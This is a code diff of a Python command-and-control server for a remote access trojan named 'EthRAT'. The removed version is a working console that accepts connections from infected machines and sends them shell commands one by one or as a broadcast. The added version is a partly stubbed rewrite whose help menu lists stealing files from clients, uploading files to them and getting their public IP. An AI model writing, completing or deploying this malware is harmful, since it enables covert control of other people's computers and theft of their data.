@@ -1,162 +1,148 @@
 import socket
 import threading
 import os
-from colorama import Fore
 import ctypes
 import queue
+from datetime import datetime
+import struct
+import sys
+
+# Colors
+cyan = "\033[1;36m"
+red = "\033[1;31m"
+green = "\033[38;5;82m"
+yellow = "\033[1;33m"
+white = "\033[39m"
+reset = "\033[0m"
+blue = "\033[1;34m"
+purple = "\033[1;35m"
 
 clients = {}
-shutdown = False 
+server_active = True
 
 LHOST = "0.0.0.0"
 LPORT = 4444
 
-def logo():
-    print(Fore.GREEN + r"""
-EEEEEEEEEEEEEEEEEEEEEE         tttt         hhhhhhh             RRRRRRRRRRRRRRRRR                  AAA         TTTTTTTTTTTTTTTTTTTTTTT
-E::::::::::::::::::::E      ttt:::t         h:::::h             R::::::::::::::::R                A:::A        T:::::::::::::::::::::T
-E::::::::::::::::::::E      t:::::t         h:::::h             R::::::RRRRRR:::::R              A:::::A       T:::::::::::::::::::::T
-EE::::::EEEEEEEEE::::E      t:::::t         h:::::h             RR:::::R     R:::::R            A:::::::A      T:::::TT:::::::TT:::::T
-  E:::::E       EEEEEEttttttt:::::ttttttt    h::::h hhhhh         R::::R     R:::::R           A:::::::::A     TTTTTT  T:::::T  TTTTTT
-  E:::::E             t:::::::::::::::::t    h::::hh:::::hhh      R::::R     R:::::R          A:::::A:::::A            T:::::T        
-  E::::::EEEEEEEEEE   t:::::::::::::::::t    h::::::::::::::hh    R::::RRRRRR:::::R          A:::::A A:::::A           T:::::T        
-  E:::::::::::::::E   tttttt:::::::tttttt    h:::::::hhh::::::h   R:::::::::::::RR          A:::::A   A:::::A          T:::::T        
-  E:::::::::::::::E         t:::::t          h::::::h   h::::::h  R::::RRRRRR:::::R        A:::::A     A:::::A         T:::::T        
-  E::::::EEEEEEEEEE         t:::::t          h:::::h     h:::::h  R::::R     R:::::R      A:::::AAAAAAAAA:::::A        T:::::T        
-  E:::::E                   t:::::t          h:::::h     h:::::h  R::::R     R:::::R     A:::::::::::::::::::::A       T:::::T        
-  E:::::E       EEEEEE      t:::::t    tttttth:::::h     h:::::h  R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A      T:::::T        
-EE::::::EEEEEEEE:::::E      t::::::tttt:::::th:::::h     h:::::hRR:::::R     R:::::R   A:::::A             A:::::A   TT:::::::TT      
-E::::::::::::::::::::E      tt::::::::::::::th:::::h     h:::::hR::::::R     R:::::R  A:::::A               A:::::A  T:::::::::T      
-E::::::::::::::::::::E        tt:::::::::::tth:::::h     h:::::hR::::::R     R:::::R A:::::A                 A:::::A T:::::::::T      
-EEEEEEEEEEEEEEEEEEEEEE          ttttttttttt  hhhhhhh     hhhhhhhRRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAATTTTTTTTTTT
-    """ + Fore.RESET)
+logo = red + r"""
+##################################
+ _____ _   _    ______  ___ _____ 
+|  ___| | | |   | ___ \/ _ \_   _|
+| |__ | |_| |__ | |_/ / /_\ \| |  
+|  __|| __| '_ \|    /|  _  || |  
+| |___| |_| | | | |\ \| | | || |  
+\____/ \__|_| |_\_| \_\_| |_/\_/  
 
-def handle_client(client_socket, addr, response_queue):
-    """
-    Handles communication with a connected client.
-    
-    - Receives messages from the client and stores them in a queue.
-    - Detects disconnections and removes the client from the list.
-    """
-    clients[addr] = client_socket
-    if os.name == "nt":
-        ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
+##################################
+""" + reset + "\n\n"
 
-    while not shutdown:
+
+def help(self):
+    """ Help Menu """
+    print(green + """
+    | ------------------ | -----------------------------------------|
+    |      Commands      |                Description               |
+    | ------------------ | -----------------------------------------|
+    |       help         | Display help menu                        |
+    |       kill         | Kill connection with client              |
+    |       download     | Download file/directory from client      |
+    |       upload       | Upload file/directory to client          |
+    |       !exec        | Execute a local command                  |
+    |       cd           | Browse to a directory                    |
+    |       getip        | Get the clients public IP                |
+    | ------------------ | -----------------------------------------|
+    """ + reset)
+
+def window_title(clients):
+        if os.name == "nt":
+                ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
+
+
+def handle_client(socket):
         try:
-            response = client_socket.recv(4096).decode()
-            if response:
-                response_queue.put((addr, response)) 
-            else:
-                break
-        except (ConnectionResetError, BrokenPipeError, OSError):
-            break
+            client_socket, addr = socket.accept()
+            clients[addr] = client_socket
+            print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n")
+            window_title(clients)
 
-    print(f"\n{Fore.RED}[-]{Fore.RESET} Client {addr[0]} disconnected")
-    client_socket.close()
-    if addr in clients:
-        del clients[addr]
+            threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()
+           
+        except (ConnectionResetError, OSError) as e:
+             print(f"{red}[-]{reset} Client error: {e}")
+             if addr in clients:
+                del clients[addr]
+                window_title(clients)
 
-def accept_clients(server, response_queue):
-    """
-    Accepts incoming client connections and starts a new thread for each client.
-    """
-    while not shutdown:
-        try:
-            client_socket, addr = server.accept()
-            print(f"\n{Fore.GREEN}[+]{Fore.RESET} New connection from {addr[0]}:{addr[1]}")
-            threading.Thread(target=handle_client, args=(client_socket, addr, response_queue), daemon=True).start()
-        except OSError as e:
-            if not shutdown:
-                print(f"Error accepting new client: {e}")
-            break
+def handle_client_commands(client_socket, addr):
+     try:
+          while server_active:
+            command = client_socket.recv(1024).decode()
+            if not command:
+                 break
+     except (ConnectionResetError, ConnectionAbortedError):
+        print(f"{red}[-]{reset} Client {addr[0]} disconnected\n")
+        client_socket.close()
+        if addr in clients:
+            del clients[addr]
+            window_title(clients)
+
+def send(sock, data):
+  """ Bulk Send Commands And Data """
+  try:
+      sock.sendall(struct.pack('>I', len(data)) + data)
+  except (ConnectionError, OSError) as e:
+        print(f"Send failed: {e}")
+
+def recv(sock):
+    """ Receive First Letter, Then Return the rest """
+    try:
+        data_size = recvall(sock, 4)
+        if not data_size:
+            return b''
+        data_len = struct.unpack('>I', data_size)[0]
+        return recvall(sock, data_len)
+    except (ConnectionError, struct.error) as e:
+        print(f"Receive failed: {e}")
+
+def recvall(sock, n):
+  """ Bulk Receive Data, Including Files and Whatnot """
+  packet = b''
+  while len(packet) < n:
+    chunk = sock.recv(n - len(packet))
+    if not chunk:
+      return None
+    packet += chunk
+  return packet
+
+def download():
+    pass
+
+def save_file():
+    pass
+
+def upload():
+    pass
 
 def start_server(lhost, lport):
-    """
-    Starts the server, listens for connections, and handles client interactions.
-    """
-    global shutdown
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.bind((lhost, lport))
+        sock.listen(5)
+        
+        os.system("cls" if os.name == "nt" else "clear")
+        print(logo)
+        print(yellow + "[*] Server Started On {}:{} < at [{}]".format(lhost, lport, datetime.now().strftime("%H:%M:%S")) + reset)
 
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind((lhost, lport))
-    server.listen(5)
+        while server_active:
+            handle_client(sock)
+    except (KeyboardInterrupt, EOFError):
+        print("Keyboard Interruption")
+        sys.exit(1)
+    except (socket.error, OSError) as e:
+        print(f"Error: {e}")
+        sys.exit(1)
+    finally:
+        sock.close()
 
-    response_queue = queue.Queue() 
-    threading.Thread(target=accept_clients, args=(server, response_queue), daemon=True).start()
-    os.system("cls" if os.name == "nt" else "clear")
-    logo()
-    print(f"[{Fore.GREEN}*{Fore.RESET}] Listening on {lhost}:{lport}")
-    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")
-
-    while True:
-        if not clients:
-            continue
-
-        print("\n[Connected Clients]")
-        for idx, addr in enumerate(clients.keys(), start=1):
-            print(f"{idx}. {addr[0]}:{addr[1]}")
-
-        try:
-            choice = input("Select client number (or 0 to broadcast): ")
-            if choice.lower() == "exit":
-                print(f"[{Fore.YELLOW}*{Fore.RESET}] Shutting down server...")
-                shutdown = True
-                server.close()
-                for client in clients.values():
-                    client.close()
-                print(f"\n[{Fore.GREEN}+{Fore.RESET}] Server closed.")
-                break
-            elif choice.lower() == "list":
-                print("\n[Connected Clients]")
-                for idx, addr in enumerate(clients.keys(), start=1):
-                    print(f"{idx}. {addr[0]}:{addr[1]}")
-                continue
-            else:
-                choice = int(choice) - 1
-        except ValueError:
-            print(f"[{Fore.RED}!{Fore.RESET}] Invalid input. Please enter a number, 'exit', or 'list'.")
-            continue
-
-
-        if choice == -1:
-            """Broadcast a command to all connected clients."""
-            while True:
-                command = input("Enter command to send (broadcast): ")
-                if command.lower() == "back":
-                    print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
-                    break
-                
-                for client in clients.values():
-                    client.send(command.encode())
-
-                responses_received = 0
-                while responses_received < len(clients):
-                    try:
-                        addr, response = response_queue.get(timeout=15)
-                        print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
-                        responses_received += 1
-                    except queue.Empty:
-                        print(f"\n{Fore.RED}[!]{Fore.RESET} Timeout waiting for responses from some clients.")
-                        break
-        elif 0 <= choice < len(clients):
-            """Send a command to a specific client."""
-            target_addr = list(clients.keys())[choice]
-            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Interacting with {target_addr[0]}")
-            
-            while True:
-                command = input(f"{target_addr[0]}> ")
-                # print('Double command debug')
-                if command.lower() == "back":
-                    print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
-                    break
-                clients[target_addr].send(command.encode())
-                try:
-                    addr, response = response_queue.get(timeout=15)
-                    print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
-                except queue.Empty:
-                    print(f"\n{Fore.RED}[!]{Fore.RESET} No response from client {target_addr[0]}")
-        else:
-            print(f"[{Fore.RED}!{Fore.RESET}] Invalid selection")
 
 if __name__ == "__main__":
     start_server(LHOST, LPORT)
